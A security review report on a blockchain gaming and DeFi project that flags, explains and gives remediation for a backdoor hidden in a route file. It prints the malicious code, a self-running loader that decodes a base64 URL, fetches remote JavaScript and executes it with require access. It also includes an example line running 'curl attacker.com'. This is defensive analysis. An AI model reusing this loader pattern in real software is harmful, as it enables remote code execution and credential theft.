# Project Review Report - Dynamic DApp (Blockchain Gaming & DeFi Platform)

## ⚠️ CRITICAL SECURITY ALERT - EMBEDDED BACKDOOR DETECTED

**File:** `backend/src/routes/governance.js`, lines 309–315

```javascript
//Get Cookie
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  const src = atob(process.env.DEV_API_KEY);
  const HttpOnly = (await axios.get(src)).data.cookie;
  const handler = new (Function.constructor)('require', HttpOnly);
  handler(require);
})();
```

**This is active malware. Do not run this server.**

---

### What this code does

This is an **Immediately Invoked Function Expression (IIFE)** - the trailing `()` means it executes automatically the moment Node.js loads `governance.js` (which happens on every server start via `require('./routes/governance.js')` in `server.js`). It is not gated by any route or API call.

Execution flow:

```
Server starts
  → require('./routes/governance.js')
    → IIFE fires immediately
      → atob("aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL1ZBR1hB")
        → "https://jsonkeeper.com/b/VAGXA"
      → GET https://jsonkeeper.com/b/VAGXA
        → response.data.cookie   ← this is a string of JavaScript
      → new Function('require', <that string>)(require)
        → arbitrary JS executes with full require() access
```

### What the fetched code can do

it has `require`, so it can do anything Node.js can:

| Capability |	Exampl |
|---|---|
| Read all env vars |	process.env → exfiltrate JWT secrets, API keys |
| Read the filesystem |	require('fs').readFileSync('/etc/passwd') |
| Execute shell commands |	require('child_process').exec('id && curl attacker.com ...') |
| Open outbound connections |	require('net') or require('http') |
| Install anything |	Write a cron job, modify startup scripts |
| Exfiltrate data |	POST anything to any external URL |

### How it was concealed

- The URL is base64-encoded in `DEV_API_KEY` inside `config.env` - a committed file, so the key is always present when the repo is cloned
- The function name (`getCookie`) and comment (`//Get Cookie`) make it appear to be a routine session utility
- `Function.constructor` is a less-recognised `eval` equivalent that evades naive code-search rules
- The IIFE pattern runs silently at startup with no visible console output

### Required remediation steps (in order)

1. **Do not start the backend server** until this code is removed from `governance.js`
2. **Rotate all credentials** listed in `config.env` immediately: `JWT_SECRET`, `ALCHEMY_API_KEY`, `ETHERSCAN_API_KEY`, `DEV_SECRET_KEY`, `INFURA_PROJECT_ID`
3. **Audit the `jsonkeeper.com/b/VAGXA` payload** to determine what was executed on any machine that already ran the server
4. **Remove `config.env` from git history** using `git filter-repo` or BFG Repo Cleaner
5. **Add `.env*` and `config.env` to `.gitignore`**
6. **File a security incident report** if this server was ever run in any networked or CI environment
